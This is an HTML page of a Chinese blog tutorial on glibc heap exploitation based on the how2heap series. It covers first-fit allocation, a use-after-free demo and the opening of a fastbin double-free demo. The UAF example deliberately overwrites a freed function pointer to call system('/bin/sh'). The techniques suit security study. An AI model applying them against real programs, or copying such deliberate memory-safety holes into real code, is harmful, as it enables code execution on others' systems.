

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <meta name="description" content="how2heap是由shellphish团队制作的堆利用教程，介绍了多种堆利用技术，后续系列实验我们就通过这个教程来学习。 first_fit123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stri">
<meta property="og:type" content="article">
<meta property="og:title" content="从how2heap入门堆">
<meta property="og:url" content="http://example.com/2021/12/26/%E4%BB%8Ehow2heap%E5%85%A5%E9%97%A8%E5%A0%86/index.html">
<meta property="og:site_name" content="verf1sh&#39;blog">
<meta property="og:description" content="how2heap是由shellphish团队制作的堆利用教程，介绍了多种堆利用技术，后续系列实验我们就通过这个教程来学习。 first_fit123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stri">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/zB2uG3tj5xVpe9Y.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/Vd2Q8JgXZ7NexYB.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/GY6WvrMNuKPi2By.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/WfulCXTUSpwZJD7.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/RbJdO5aZHzo8TyD.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/SpE21zDPuvLURel.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/UrDWJea4HjBx1b5.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/IJ8EZ7QteOms2yr.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/WsBCEgcFLiZ9OoX.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/Dc42gqKOk3NAsmP.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/fQ8OCIcztrjRWP7.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/9Cz8Rwemsoh1lpH.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/aYAMKF6UpwC27Vv.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/yS1GaoiTJD6dL7k.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/ip2LPoaBOdmU9bY.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/zyAWqFnrboTB2X9.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/1VnfpvsWY9HIq4K.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/BjUekKNVGlQXFJW.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/4ywNIAQ9JtSiejq.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/Zy6USAriPhuIRgK.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/y74YorLXn1PRiMJ.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/EXB6RlLAI9hNeoi.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/FDcqGbesp4BZoUt.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/xo5yCTlZS2fzkdY.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/xdJGagBlwskFinf.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/ZC1GbzYuLrhTHV7.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/jG4UgWJpoimCnFB.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/yVOo9LlKQU3zZjX.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/Sbfe9uoiYKvVp3P.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/oNGmvz9xDElKc73.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/wDyOdNUXPuYReb3.png">
<meta property="og:image" content="d:/blog/source_posts/images/image-20211226160833206-16405140388341.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/6jPLABEZuC5l3y7.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/SOMy7DpWr5Hgaj1.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/YDqzityo6njvwJh.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/kEyFYcx7LwpUvb1.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/1dlPECB5yGANDan.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/3lNkeFrcX4zEMi2.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/jVTrtA6kOqgdDlS.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/1vGVAkyEuctxZML.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/42IyOtYRnhDbXLo.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/ojxtzO3HE846lr5.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/5OyWv8dVYRTa4wj.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/RGWzOsBaIo3iklQ.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/JWZ3aK6tqDVk8oX.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/y5V1W26vkqjYgpE.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/TvWyefJ19bFz7La.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/cOJpNVPItwQTREK.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/eTDvralqCkFRJ5V.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/PbgcKN1Rm2wMW7n.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/QKSJm9X8iYlOyfZ.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/x6e9ujCEaIkrSJR.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/amQFXLNWRftEqbp.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/AY5ETmLWcVjosv9.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/mTQBqEvzVJIyWo7.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/AslPx52ywJGFWMf.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/nWIehUSBNYQKbVr.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/ezX5kUS1lRtJgVB.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/INPjVX1byFdmBAg.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/RGsX3Ul2ywgC9p8.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/DJbhTS1ERQCc2VF.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/HPVgs8etxRNj7bo.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/EPrmF1XuZSLHvw3.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/k1BqnwV7jJ9hEe6.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/FLhHWCkbZzlNr7i.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/6mf2nzNps5M79lZ.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/Usu5Bhy3J1IkLlP.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/UICXhL4nvl8bEVy.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/jcaBrYehQ29wHJp.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/BgMTDC7jNW9Vnbc.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/NcRMZmEYb3sAyVp.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/sS1oNBz9LEM5UdQ.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/m3eKYposyubTgCq.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/1Z9ExJODHmry2uw.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/IQHym7GTUNXRkE4.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/x2lRQHnNWmoy6b1.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/6N4o2xGqDPghuHO.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/rlAmkNfTFjqy6aX.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/nR4rjuL1OTYPeQJ.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/nAIwNXGPojFuUD4.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/ON9vpwZRDUVMgnj.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/ekC8BfcU2sgn9VI.png">
<meta property="og:image" content="d:/blog/source_posts/images/image-20211226162928596-16405140388352.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/Z743qRXiQmeB8TY.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/KgAflpt5n1JNHZE.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/H9ju6V8PoMCXhGO.png">
<meta property="og:image" content="https://s2.loli.net/2021/12/26/Hj3nSoEiYXfrMgw.png">
<meta property="article:published_time" content="2021-12-26T10:20:16.000Z">
<meta property="article:modified_time" content="2021-12-26T10:26:08.939Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="how2heap">
<meta property="article:tag" content="堆">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://s2.loli.net/2021/12/26/zB2uG3tj5xVpe9Y.png">
  
  <title>从how2heap入门堆 - verf1sh&#39;blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>verf1sh&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="从how2heap入门堆">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-12-26 18:20" pubdate>
        2021年12月26日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      39k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      122 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">从how2heap入门堆</h1>
            
            <div class="markdown-body">
              <p>how2heap是由shellphish团队制作的堆利用教程，介绍了多种堆利用技术，后续系列实验我们就通过这个教程来学习。</p>
<h2 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;尽管这个例子没有演示攻击效果，但是它演示了 glibc 的分配机制\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;glibc 使用首次适应算法选择空闲的堆块\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;如果有一个空闲堆块且足够大，那么 malloc 将选择它\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;如果存在 use-after-free 的情况那可以利用这一特性\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;首先申请两个比较大的 chunk\n&quot;</span>);<br>    <span class="hljs-keyword">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x512</span>);<br>    <span class="hljs-keyword">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x256</span>);<br>    <span class="hljs-keyword">char</span>* c;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一个 a = malloc(0x512) 在: %p\n&quot;</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第二个 b = malloc(0x256) 在: %p\n&quot;</span>, b);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们可以继续分配\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在我们把 \&quot;AAAAAAAA\&quot; 这个字符串写到 a 那里 \n&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一次申请的 %p 指向 %s\n&quot;</span>, a, a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来 free 掉第一个...\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来只要我们申请一块小于 0x512 的 chunk，那就会分配到原本 a 那里: %p\n&quot;</span>, a);<br><br>    c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三次 c = malloc(0x500) 在: %p\n&quot;</span>, c);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们这次往里写一串 \&quot;CCCCCCCC\&quot; 到刚申请的 c 中\n&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;CCCCCCCC&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三次申请的 c %p 指向 %s\n&quot;</span>, c, c);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一次申请的 a %p 指向 %s\n&quot;</span>, a, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;可以看到，虽然我们刚刚看的是 a 的，但它的内容却是 \&quot;CCCCCCCC\&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个程序并不展示如何攻击，而是展示glibc的一种分配规则。glibc 使用一种first-fit算法去选择一个free-chunk。如果存在一个free-chunk并且足够大的话，malloc会优先选取这个chunk。这种机制就可以在被利用于use after free(简称 uaf) 的情形中.</p>
<p>使用命令<code>gcc -g first_fit.c -o first_fit</code>编译，-g参数会保留代码的文字信息，便于调试。</p>
<p>运行一下看看</p>
<p><img src="https://s2.loli.net/2021/12/26/zB2uG3tj5xVpe9Y.png" srcset="/img/loading.gif" lazyload></p>
<p>   程序展示了一个 glibc 堆分配策略，first-fit。在分配内存时，malloc 先到 unsorted bin（或者 fastbins）中查找适合的被 free 的 chunk，如果没有，就会把 unsorted bin 中的所有 chunk 分别放入到所属的 bins 中，然后再去这些 bins 里去寻找适合的 chunk。可以看到第三次 malloc 的地址和第一次相同，即 malloc 找到了第一次 free 掉的 chunk，并把它重新分配。</p>
<p>​    下断点，对着源码调试着理解一下</p>
<p>​    先是malloc了两次，第一个堆块的内容为“AAAAAAAA”对应0x41414141…，第二个堆块的内容为“BBBBBBBB”，对应0x42424242…。</p>
<p> <img src="https://s2.loli.net/2021/12/26/Vd2Q8JgXZ7NexYB.png" srcset="/img/loading.gif" lazyload></p>
<p>然后free了a，这时候a被放到了unsorted bin中。</p>
<p> <img src="https://s2.loli.net/2021/12/26/GY6WvrMNuKPi2By.png" srcset="/img/loading.gif" lazyload>    </p>
<p>​    然后再去申请一个小于free chunk的大小的内存空间，根据first fit就会分配到这里。可以发现，当释放了一块内存之后再去申请一个大小略小的空间，那么glibc倾向于将先前释放的空间重新分配。</p>
<p> <img src="https://s2.loli.net/2021/12/26/WfulCXTUSpwZJD7.png" srcset="/img/loading.gif" lazyload></p>
<p>​    加上参数重新编译一个版本：gcc -fsanitize=address -g first_fit.c，会提示有个 use-after-free 漏洞 <img src="https://s2.loli.net/2021/12/26/RbJdO5aZHzo8TyD.png" srcset="/img/loading.gif" lazyload></p>
<p>​    UAF 漏洞简单来说就是第一次申请的内存释放之后，没有进行内存回收，下次申请的时候还能申请到这一块内存，导致我们可以用以前的内存指针来访问修改过的内存。</p>
<p>​    来看一下一个简单的 UAF 的利用的例子。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(*func_ptr)</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">evil_fuc</span><span class="hljs-params">(<span class="hljs-keyword">char</span> command[])</span></span><br><span class="hljs-function"></span>&#123;<br>    system(command);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">echo</span><span class="hljs-params">(<span class="hljs-keyword">char</span> content[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,content);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    func_ptr *p1=(func_ptr*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请了4个int大小的内存&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1 的地址: %p\n&quot;</span>,p1);<br>    p1[<span class="hljs-number">1</span>]=echo;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;把p1[1]赋值为echo函数，然后打印出\&quot;hello world\&quot;&quot;</span>);<br>    p1[<span class="hljs-number">1</span>](<span class="hljs-string">&quot;hello world\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free 掉 p1&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p1); <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;因为并没有置为null，所以p1[1]仍然是echo函数，仍然可以输出打印了\&quot;hello again\&quot;&quot;</span>);<br>    p1[<span class="hljs-number">1</span>](<span class="hljs-string">&quot;hello again\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接下来再去malloc一个p2，会把释放掉的p1给分配出来，可以看到他俩是同一地址的&quot;</span>);<br>    func_ptr *p2=(func_ptr*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p2 的地址: %p\n&quot;</span>,p2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1 的地址: %p\n&quot;</span>,p1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;然后把p2[1]给改成evil_fuc也就是system函数&quot;</span>);<br>    p2[<span class="hljs-number">1</span>]=evil_fuc;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;传参调用&quot;</span>);<br>    p1[<span class="hljs-number">1</span>](<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​    依然使用之前的编译命令，然后动态调试看一下，首先申请了一个chunk，把那个p1[1]改成了echo函数的地址。</p>
<p> <img src="https://s2.loli.net/2021/12/26/SpE21zDPuvLURel.png" srcset="/img/loading.gif" lazyload></p>
<p>​    free掉之后再申请一个大小相同的p2，这时候会把之前p1的内存区域分配给p2，也就是说可以用p2来控制p1的内容了</p>
<p> <img src="https://s2.loli.net/2021/12/26/UrDWJea4HjBx1b5.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>   fastbin主要是用来放一些小的内存的，来提高效率。源码如下</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这个例子演示了 fastbin 的 double free\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;首先申请了 3 个 chunk\n&quot;</span>);<br>    <span class="hljs-keyword">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>    <span class="hljs-keyword">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(b, <span class="hljs-string">&quot;BBBBBBBB&quot;</span>);<br>    <span class="hljs-keyword">char</span>* c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;CCCCCCCC&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一个 malloc(8): %p\n&quot;</span>, 